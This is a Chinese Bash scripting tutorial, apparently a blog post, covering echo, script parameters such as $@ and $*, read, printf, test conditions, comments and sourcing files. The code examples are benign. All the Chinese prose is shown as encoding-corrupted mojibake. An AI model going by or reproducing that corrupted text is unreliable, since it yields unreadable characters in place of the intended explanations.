<h3 id="echoå‘½ä»¤">echoå‘½ä»¤</h3>
<p>Shell çš„ echo æŒ‡ä»¤ä¸ PHP çš„ echo æŒ‡ä»¤ç±»ä¼¼ï¼Œéƒ½æ˜¯ç”¨äºå­—ç¬¦ä¸²çš„è¾“å‡ºã€‚å‘½ä»¤æ ¼å¼ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> string</span><br></pre></td></tr></table></figure>
<p>ç¤ºä¾‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#æ˜¾ç¤ºæ™®é€šå­—ç¬¦ä¸²:</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;It is a test&quot;</span>       <span class="comment">#è¿™é‡Œçš„åŒå¼•å·å®Œå…¨å¯ä»¥çœç•¥ï¼Œä»¥ä¸‹å‘½ä»¤ä¸ä¸Šé¢å®ä¾‹æ•ˆæœä¸€è‡´ï¼š</span></span><br><span class="line"><span class="built_in">echo</span> It is a <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ˜¾ç¤ºè½¬ä¹‰å­—ç¬¦:</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;\&quot;It is a test\&quot;&quot;</span>   <span class="comment">#ç»“æœ:&quot;It is a test&quot;</span></span><br><span class="line"><span class="built_in">echo</span> \&quot;It is a <span class="built_in">test</span>\&quot;     <span class="comment">#åŒæ ·ï¼ŒåŒå¼•å·ä¹Ÿå¯ä»¥çœç•¥</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># -e å¼€å¯è½¬ä¹‰</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;It is a test&quot;</span></span><br><span class="line"><span class="built_in">echo</span> -e <span class="string">&quot;It is \n a test\c&quot;</span></span><br><span class="line"><span class="comment"># æ‰§è¡Œç»“æœ</span></span><br><span class="line">[15:38:16 root@rocky95 ~]# sh 1.sh </span><br><span class="line">It is a <span class="built_in">test</span></span><br><span class="line">It is </span><br><span class="line"> a <span class="built_in">test</span>[15:38:19 root@rocky95 ~]# </span><br></pre></td></tr></table></figure>
<h3 id="Shellä¼ é€’å‚æ•°">Shellä¼ é€’å‚æ•°</h3>
<p>shellå˜é‡é™¤äº†å¯ä»¥ç›´æ¥èµ‹å€¼å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨è„šæœ¬ä¼ å‚å’Œreadå‘½ä»¤ä»æ ‡å‡†è¾“å…¥ä¸­è·å¾—ï¼Œreadä¸ºbashå†…ç½®å‘½ä»¤;</p>
<h4 id="è°ƒç”¨è„šæœ¬æ—¶ä¼ å…¥å‚æ•°">è°ƒç”¨è„šæœ¬æ—¶ä¼ å…¥å‚æ•°</h4>
<p>æ‰§è¡Œ Shell è„šæœ¬æ—¶ï¼Œå‘è„šæœ¬ä¼ é€’å‚æ•°ï¼Œè„šæœ¬å†…è·å–å‚æ•°çš„æ ¼å¼ä¸ºï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sh filename.sh var1 var2 ...... varn</span><br></pre></td></tr></table></figure>
<p><strong>n</strong> ä»£è¡¨ä¸€ä¸ªæ•°å­—ï¼Œ$1 ä¸ºæ‰§è¡Œè„šæœ¬çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼Œ$2 ä¸ºæ‰§è¡Œè„šæœ¬çš„ç¬¬äºŒä¸ªå‚æ•°ï¼Œä»¥æ­¤ç±»æ¨â€¦â€¦</p>
<p><strong>$0</strong> ä¸ºæ‰§è¡Œçš„æ–‡ä»¶å</p>
<p>test.shæ–‡ä»¶å†…å®¹å¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Shell ä¼ é€’å‚æ•°å®ä¾‹ï¼&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;æ‰§è¡Œçš„æ–‡ä»¶åï¼š<span class="variable">$0</span>&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºï¼š<span class="variable">$1</span>&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ç¬¬äºŒä¸ªå‚æ•°ä¸ºï¼š<span class="variable">$2</span>&quot;</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºï¼š<span class="variable">$3</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">#è¿è¡Œç»“æœï¼š</span></span><br><span class="line">sh test.sh 1 2 3</span><br><span class="line">Shell ä¼ é€’å‚æ•°å®ä¾‹ï¼</span><br><span class="line">æ‰§è¡Œçš„æ–‡ä»¶åï¼štest.sh</span><br><span class="line">ç¬¬ä¸€ä¸ªå‚æ•°ä¸ºï¼š1</span><br><span class="line">ç¬¬äºŒä¸ªå‚æ•°ä¸ºï¼š2</span><br><span class="line">ç¬¬ä¸‰ä¸ªå‚æ•°ä¸ºï¼š3</span><br></pre></td></tr></table></figure>
<p><font class="notice">æ³¨æ„ï¼šå½“â€nâ€œä¸ºå¤šä½æ—¶ï¼Œè„šæœ¬å†…å˜é‡éœ€è¦ç”¨å¤§æ‹¬å·â€œ{}â€åŒ…æ‹¬ï¼Œä¸ç„¶åªèƒ½è¯†åˆ«ç¬¬ä¸€ä½</font></p>
<p>å‚æ•°è·å–ï¼š</p>
<table>
<thead>
<tr>
<th>å‚æ•°å¤„ç†</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>$#</code></td>
<td>ä¼ é€’åˆ°è„šæœ¬çš„å‚æ•°ä¸ªæ•°</td>
</tr>
<tr>
<td><code>$$</code></td>
<td>è„šæœ¬è¿è¡Œçš„å½“å‰è¿›ç¨‹IDå·</td>
</tr>
<tr>
<td><code>$!</code></td>
<td>åå°è¿è¡Œçš„æœ€åä¸€ä¸ªè¿›ç¨‹çš„IDå·</td>
</tr>
<tr>
<td><code>$*</code></td>
<td>æ‰€æœ‰å‚æ•°ä½œä¸ºä¸€ä¸ªå­—ç¬¦ä¸²ä¼ å‡º</td>
</tr>
<tr>
<td><code>$@</code></td>
<td>æ‰€æœ‰çš„å‚æ•°ä¸€ä¸ªä¸€ä¸ªä¼ å‡ºæ¥</td>
</tr>
<tr>
<td><code>$?</code></td>
<td>æ˜¾ç¤ºæœ€åå‘½ä»¤çš„é€€å‡ºçŠ¶æ€ã€‚0è¡¨ç¤ºæ²¡æœ‰é”™è¯¯ï¼Œå…¶ä»–ä»»ä½•å€¼è¡¨æ˜æœ‰é”™è¯¯ã€‚</td>
</tr>
</tbody>
</table>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;$1=&#x27;</span><span class="variable">$1</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;$2=&#x27;</span><span class="variable">$2</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;$10=&#x27;</span><span class="variable">$10</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;$10=&#x27;</span><span class="variable">$&#123;10&#125;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;$$=&#x27;</span>$$</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;$#=&#x27;</span><span class="variable">$#</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;$@=&#x27;</span><span class="variable">$@</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;$*=&#x27;</span>$*</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;$?=&#x27;</span>$?</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰§è¡Œè„šæœ¬ï¼Œè¾“å‡ºç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼š</span></span><br><span class="line">sh 1.sh a b c d e f g h i j</span><br><span class="line"><span class="variable">$1</span>=a</span><br><span class="line"><span class="variable">$2</span>=b</span><br><span class="line"><span class="variable">$10</span>=a0</span><br><span class="line"><span class="variable">$10</span>=j</span><br><span class="line">$$=3636848</span><br><span class="line"><span class="variable">$#</span>=10</span><br><span class="line"><span class="variable">$@</span>=a b c d e f g h i j</span><br><span class="line">$*=a b c d e f g h i j</span><br><span class="line">$?=0</span><br></pre></td></tr></table></figure>
<p><code>$*</code>ä¸<code>$@</code>çš„åŒºåˆ«ï¼š</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>åªæœ‰åœ¨åŒå¼•å·ä¸­ä½“ç°å‡ºæ¥ã€‚å‡è®¾åœ¨è„šæœ¬è¿è¡Œæ—¶å†™äº†ä¸‰ä¸ªå‚æ•° 1ã€2ã€3ï¼Œï¼Œåˆ™<code>$*</code> ç­‰ä»·äº â€œ1 2 3â€ï¼ˆä¼ é€’äº†ä¸€ä¸ªå‚æ•°ï¼‰ï¼Œè€Œ<code>$@</code>ç­‰ä»·äº â€œ1â€ â€œ2â€ â€œ3â€ï¼ˆä¼ é€’äº†ä¸‰ä¸ªå‚æ•°ï¼‰ã€‚</p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;-- \&quot;\$*\&quot; æ¼”ç¤º ---&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;$*&quot;</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;-- \&quot;\$@\&quot; æ¼”ç¤º ---&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="string">&quot;<span class="variable">$@</span>&quot;</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;-- \$* æ¼”ç¤º ---&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> $*; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;-- \$@ æ¼”ç¤º ---&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="variable">$@</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$i</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#æ‰§è¡Œè„šæœ¬ï¼Œè¾“å‡ºç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼š</span></span><br><span class="line">python@ubuntu:~/test$ sh <span class="built_in">test</span> 1 2 3</span><br><span class="line">-- <span class="string">&quot;$*&quot;</span> æ¼”ç¤º ---</span><br><span class="line">1 2 3</span><br><span class="line">-- <span class="string">&quot;<span class="variable">$@</span>&quot;</span> æ¼”ç¤º ---</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">-- $* æ¼”ç¤º ---</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">-- <span class="variable">$@</span> æ¼”ç¤º ---</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td></tr></table></figure>
<h4 id="read-å‘½ä»¤"><strong>read å‘½ä»¤</strong></h4>
<p>ä»æ ‡å‡†è¾“å…¥ä¸­è¯»å–ä¸€è¡Œ,å¹¶æŠŠè¾“å…¥è¡Œçš„æ¯ä¸ªå­—æ®µçš„å€¼æŒ‡å®šç»™ shell å˜é‡ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># read</span></span><br><span class="line"><span class="built_in">read</span> var      <span class="comment">#äº¤äº’å¼ä¼ å‚ç»™var</span></span><br><span class="line">-p var	      <span class="comment">#è®¾ç½®äº¤äº’è¿‡ç¨‹ç›¸å…³æç¤ºä¿¡æ¯ prompt</span></span><br><span class="line">-t var        <span class="comment">#è®¾ç½®äº¤äº’è¿‡ç¨‹ç­‰å¾…æ—¶é—´ä¿¡æ¯ timeout</span></span><br></pre></td></tr></table></figure>
<p>ç¤ºä¾‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">read</span> name </span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;You name is <span class="variable">$name</span>!&quot;</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;è¯·é‡æ–°è¾“å…¥ä½ çš„åå­—ï¼š&quot;</span> name</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;You name is <span class="variable">$name</span>!&quot;</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">&quot;è¿™ä¸ªè¾“å…¥åªå­˜åœ¨10sï¼š &quot;</span> -t 10 name</span><br><span class="line"><span class="built_in">echo</span> 10såˆ°äº†ï¼ï¼</span><br><span class="line"><span class="comment">#æ‰§è¡Œç»“æœ:</span></span><br><span class="line">[15:34:25 root@rocky95 ~]# sh test.sh</span><br><span class="line">Corazon                        <span class="comment">#æ ‡å‡†è¾“å…¥</span></span><br><span class="line">You name is Corazon!           <span class="comment">#è¾“å‡º</span></span><br><span class="line">è¯·é‡æ–°è¾“å…¥ä½ çš„åå­—ï¼šCorazon        <span class="comment">#è®¾ç½®äº¤äº’è¿‡ç¨‹ç›¸å…³æç¤ºä¿¡æ¯</span></span><br><span class="line">You name is Corazon!           <span class="comment">#è¾“å‡º</span></span><br><span class="line">è¿™ä¸ªè¾“å…¥åªå­˜åœ¨10sï¼š 10såˆ°äº†ï¼ï¼     <span class="comment">#è®¾ç½®äº¤äº’è¿‡ç¨‹ç­‰å¾…æ—¶é—´ä¿¡æ¯#è¾“å‡º </span></span><br></pre></td></tr></table></figure>
<h3 id="printf-å‘½ä»¤">printf å‘½ä»¤</h3>
<p>printf å‘½ä»¤å¯ä»¥å®ç°æ ‡å‡†åŒ–è¾“å‡ºï¼Œprintf å‘½ä»¤çš„è¯­æ³•ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>  format-string  [arguments...]</span><br></pre></td></tr></table></figure>
<p><strong>å‚æ•°è¯´æ˜ï¼š</strong></p>
<ul class="lvl-0">
<li class="lvl-2">
<p><strong>format-string:</strong> ä¸ºæ ¼å¼æ§åˆ¶å­—ç¬¦ä¸²</p>
</li>
<li class="lvl-2">
<p><strong>arguments:</strong> ä¸ºå‚æ•°åˆ—è¡¨ã€‚</p>
</li>
</ul>
<p>å®ä¾‹å¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%-10s %-8s %-4s\n&quot;</span> å§“å æ€§åˆ« ä½“é‡kg  </span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%-10s %-8s %-4.2f\n&quot;</span> éƒ­é– ç”· 66.1234 </span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%-10s %-8s %-4.2f\n&quot;</span> æ¨è¿‡ ç”· 48.6543 </span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;%-10s %-8s %-4.2f\n&quot;</span> éƒ­èŠ™ å¥³ 47.9876 </span><br><span class="line"></span><br><span class="line"><span class="comment">#æ‰§è¡Œè„šæœ¬ï¼Œè¾“å‡ºç»“æœå¦‚ä¸‹æ‰€ç¤ºï¼š</span></span><br><span class="line">å§“å     æ€§åˆ«   ä½“é‡kg</span><br><span class="line">éƒ­é–     ç”·      66.12</span><br><span class="line">æ¨è¿‡     ç”·      48.65</span><br><span class="line">éƒ­èŠ™     å¥³      47.99</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p>%s %c %d %féƒ½æ˜¯æ ¼å¼æ›¿ä»£ç¬¦</p>
</li>
<li class="lvl-2">
<p>%-10s æŒ‡ä¸€ä¸ªå®½åº¦ä¸º10ä¸ªå­—ç¬¦ï¼ˆ-è¡¨ç¤ºå·¦å¯¹é½ï¼Œæ²¡æœ‰åˆ™è¡¨ç¤ºå³å¯¹é½ï¼‰ï¼Œä»»ä½•å­—ç¬¦éƒ½ä¼šè¢«æ˜¾ç¤ºåœ¨10ä¸ªå­—ç¬¦å®½çš„å­—ç¬¦å†…ï¼Œå¦‚æœä¸è¶³åˆ™è‡ªåŠ¨ä»¥ç©ºæ ¼å¡«å……ï¼Œè¶…è¿‡ä¹Ÿä¼šå°†å†…å®¹å…¨éƒ¨æ˜¾ç¤ºå‡ºæ¥ã€‚</p>
</li>
<li class="lvl-2">
<p>%-4.2f æŒ‡æ ¼å¼åŒ–ä¸ºå°æ•°ï¼Œå…¶ä¸­.2æŒ‡ä¿ç•™2ä½å°æ•°ã€‚</p>
</li>
</ul>
<p>printfçš„è½¬ä¹‰åºåˆ—ï¼š</p>
<table>
<thead>
<tr>
<th>åºåˆ—</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody>
<tr>
<td>\a</td>
<td>è­¦å‘Šå­—ç¬¦ï¼Œé€šå¸¸ä¸ºASCIIçš„BELå­—ç¬¦</td>
</tr>
<tr>
<td>\b</td>
<td>åé€€</td>
</tr>
<tr>
<td>\c</td>
<td>æŠ‘åˆ¶ï¼ˆä¸æ˜¾ç¤ºï¼‰è¾“å‡ºç»“æœä¸­ä»»ä½•ç»“å°¾çš„æ¢è¡Œå­—ç¬¦ï¼ˆåªåœ¨%bæ ¼å¼æŒ‡ç¤ºç¬¦æ§åˆ¶ä¸‹çš„å‚æ•°å­—ç¬¦ä¸²ä¸­æœ‰æ•ˆï¼‰ï¼Œè€Œä¸”ï¼Œä»»ä½•ç•™åœ¨å‚æ•°é‡Œçš„å­—ç¬¦ã€ä»»ä½•æ¥ä¸‹æ¥çš„å‚æ•°ä»¥åŠä»»ä½•ç•™åœ¨æ ¼å¼å­—ç¬¦ä¸²ä¸­çš„å­—ç¬¦ï¼Œéƒ½è¢«å¿½ç•¥</td>
</tr>
<tr>
<td>\f</td>
<td>æ¢é¡µï¼ˆformfeedï¼‰</td>
</tr>
<tr>
<td>\n</td>
<td>æ¢è¡Œ</td>
</tr>
<tr>
<td>\r</td>
<td>å›è½¦ï¼ˆCarriage returnï¼‰</td>
</tr>
<tr>
<td>\t</td>
<td>æ°´å¹³åˆ¶è¡¨ç¬¦</td>
</tr>
<tr>
<td>\v</td>
<td>å‚ç›´åˆ¶è¡¨ç¬¦</td>
</tr>
<tr>
<td>\</td>
<td>ä¸€ä¸ªå­—é¢ä¸Šçš„åæ–œæ å­—ç¬¦</td>
</tr>
<tr>
<td>\ddd</td>
<td>è¡¨ç¤º1åˆ°3ä½æ•°å…«è¿›åˆ¶å€¼çš„å­—ç¬¦ã€‚ä»…åœ¨æ ¼å¼å­—ç¬¦ä¸²ä¸­æœ‰æ•ˆ</td>
</tr>
<tr>
<td>\0ddd</td>
<td>è¡¨ç¤º1åˆ°3ä½çš„å…«è¿›åˆ¶å€¼å­—ç¬¦</td>
</tr>
</tbody>
</table>
<p>ä¾‹å­ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span> <span class="string">&quot;a string, no processing:&lt;%s&gt;\n&quot;</span> <span class="string">&quot;A\nB&quot;</span></span><br><span class="line">a string, no processing:&lt;A\nB&gt;</span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;a string, no processing:&lt;%b&gt;\n&quot;</span> <span class="string">&quot;A\nB&quot;</span></span><br><span class="line">a string, no processing:&lt;A</span><br><span class="line">B&gt;</span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;www.runoob.com \a&quot;</span></span><br><span class="line">www.runoob.com [14:11:29 root@centon7 ~]# </span><br></pre></td></tr></table></figure>
<h3 id="testå‘½ä»¤">testå‘½ä»¤</h3>
<p>Shellä¸­çš„ test å‘½ä»¤ç”¨äºæ£€æŸ¥æŸä¸ªæ¡ä»¶æ˜¯å¦æˆç«‹ï¼Œå®ƒå¯ä»¥è¿›è¡Œæ•°å€¼ã€å­—ç¬¦å’Œæ–‡ä»¶ä¸‰ä¸ªæ–¹é¢çš„æµ‹è¯•ã€‚</p>
<p>å®ä¾‹æ¼”ç¤ºï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#01 æ•°å€¼æµ‹è¯•</span></span><br><span class="line">num1=10</span><br><span class="line">num2=5</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> $[num1 / num2] -eq $[num2-num1]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;ä¸¤ä¸ªæ•°ç›¸ç­‰ï¼&#x27;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;ä¸¤ä¸ªæ•°ä¸ç›¸ç­‰ï¼&#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment">#è¾“å‡ºç»“æœï¼š</span></span><br><span class="line"><span class="comment">#ä¸¤ä¸ªæ•°ä¸ç›¸ç­‰ï¼</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#02 å­—ç¬¦ä¸²æµ‹è¯•</span></span><br><span class="line">num1=<span class="string">&quot;ru1noob&quot;</span></span><br><span class="line">num2=<span class="string">&quot;runoob&quot;</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> <span class="variable">$num1</span> = <span class="variable">$num2</span></span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;ä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰!&#x27;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;ä¸¤ä¸ªå­—ç¬¦ä¸²ä¸ç›¸ç­‰!&#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment">#è¾“å‡ºç»“æœï¼š</span></span><br><span class="line"><span class="comment">#ä¸¤ä¸ªå­—ç¬¦ä¸²ä¸ç›¸ç­‰!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># æ–‡ä»¶æµ‹è¯•</span></span><br><span class="line"><span class="built_in">cd</span> /bin</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> -e ./bash</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;æ–‡ä»¶å·²å­˜åœ¨!&#x27;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;æ–‡ä»¶ä¸å­˜åœ¨!&#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment">#è¾“å‡ºç»“æœï¼š</span></span><br><span class="line"><span class="comment">#æ–‡ä»¶å·²å­˜åœ¨!</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#å¦å¤–ï¼ŒShellè¿˜æä¾›äº†ä¸( -a )ã€æˆ–( -o )ã€é( ! )ä¸‰ä¸ªé€»è¾‘æ“ä½œç¬¦ç”¨äºå°†æµ‹è¯•æ¡ä»¶è¿æ¥èµ·æ¥ï¼Œå…¶ä¼˜å…ˆçº§ä¸ºï¼š&quot;!â€œæœ€é«˜ï¼Œâ€-a&quot;æ¬¡ä¹‹ï¼Œ&quot;-o&quot;æœ€ä½ã€‚ä¾‹å¦‚ï¼š</span></span><br><span class="line"><span class="built_in">cd</span> /bin</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">test</span> -e ./notFile -o -e ./bash</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;è‡³å°‘æœ‰ä¸€ä¸ªæ–‡ä»¶å­˜åœ¨!&#x27;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;ä¸¤ä¸ªæ–‡ä»¶éƒ½ä¸å­˜åœ¨&#x27;</span></span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"><span class="comment">#è¾“å‡ºç»“æœï¼š</span></span><br><span class="line"><span class="comment">#è‡³å°‘æœ‰ä¸€ä¸ªæ–‡ä»¶å­˜åœ¨!</span></span><br></pre></td></tr></table></figure>
<h3 id="Shell-æ³¨é‡Š">Shell æ³¨é‡Š</h3>
<p>ä»¥ <strong>#</strong> å¼€å¤´çš„è¡Œå°±æ˜¯æ³¨é‡Šï¼Œä¼šè¢«è§£é‡Šå™¨å¿½ç•¥ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#--------------------------------------------</span></span><br><span class="line"><span class="comment"># è¿™æ˜¯ä¸€ä¸ªæ³¨é‡Š</span></span><br><span class="line"><span class="comment"># authorï¼šCorazon</span></span><br><span class="line"><span class="comment"># siteï¼šwww.mcorazon.top</span></span><br><span class="line"><span class="comment"># sloganï¼šå¼ºè€…ï¼Œç»éå¶ç„¶ï¼</span></span><br><span class="line"><span class="comment">#--------------------------------------------</span></span><br><span class="line"><span class="comment">### ç”¨æˆ·é…ç½®åŒº å¼€å§‹ ###</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># è¿™é‡Œå¯ä»¥æ·»åŠ è„šæœ¬æè¿°ä¿¡æ¯</span></span><br><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">### ç”¨æˆ·é…ç½®åŒº ç»“æŸ  ###</span></span><br></pre></td></tr></table></figure>
<p>å¤šè¡Œæ³¨é‡Šè¿˜å¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ ¼å¼ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">:&lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">æ³¨é‡Šå†…å®¹...</span></span><br><span class="line"><span class="string">æ³¨é‡Šå†…å®¹...</span></span><br><span class="line"><span class="string">æ³¨é‡Šå†…å®¹...</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>
<p>EOF ä¹Ÿå¯ä»¥ä½¿ç”¨å…¶ä»–ç¬¦å·:</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">:&lt;&lt;<span class="string">&#x27;</span></span><br><span class="line"><span class="string">æ³¨é‡Šå†…å®¹...</span></span><br><span class="line"><span class="string">&#x27;</span></span><br><span class="line"></span><br><span class="line">:&lt;&lt;!</span><br><span class="line">æ³¨é‡Šå†…å®¹...</span><br><span class="line">!</span><br></pre></td></tr></table></figure>
<h3 id="æ–‡ä»¶åŒ…å«">æ–‡ä»¶åŒ…å«</h3>
<p>Shellå¯ä»¥ä½¿ç”¨æ–‡ä»¶åŒ…å«æ¥è°ƒç”¨å˜é‡å’Œå‡½æ•°ç­‰ã€‚Shell æ–‡ä»¶åŒ…å«çš„è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">. filename   <span class="comment"># æ³¨æ„ç‚¹å·(.)å’Œæ–‡ä»¶åä¸­é—´æœ‰ä¸€ç©ºæ ¼</span></span><br><span class="line">æˆ–</span><br><span class="line"><span class="built_in">source</span> filename</span><br></pre></td></tr></table></figure>
<p><strong>å®ä¾‹</strong></p>
<p>åˆ›å»ºä¸¤ä¸ª shell è„šæœ¬æ–‡ä»¶ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#test1.sh ä»£ç å¦‚ä¸‹ï¼š</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line">url=<span class="string">&quot;http://www.baidu.com&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#test2.sh ä»£ç å¦‚ä¸‹ï¼š</span></span><br><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="comment">#ä½¿ç”¨ . å·æ¥å¼•ç”¨test1.sh æ–‡ä»¶</span></span><br><span class="line">. ./test1.sh</span><br><span class="line"><span class="comment"># æˆ–è€…ä½¿ç”¨ä»¥ä¸‹åŒ…å«æ–‡ä»¶ä»£ç </span></span><br><span class="line"><span class="comment"># source ./test1.sh</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;urlåœ°å€ï¼š<span class="variable">$url</span>&quot;</span></span><br></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬ä¸º <a href="http://test2.sh">test2.sh</a> æ·»åŠ å¯æ‰§è¡Œæƒé™å¹¶æ‰§è¡Œï¼š</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">chmod</span> +x test2.sh </span><br><span class="line">$ ./test2.sh </span><br><span class="line">urlåœ°å€ï¼šhttp://www.baidu.com</span><br></pre></td></tr></table></figure>
<blockquote>
<p>**æ³¨ï¼š**è¢«åŒ…å«çš„æ–‡ä»¶ <a href="http://test1.sh">test1.sh</a> ä¸éœ€è¦å¯æ‰§è¡Œæƒé™ã€‚</p>
</blockquote>
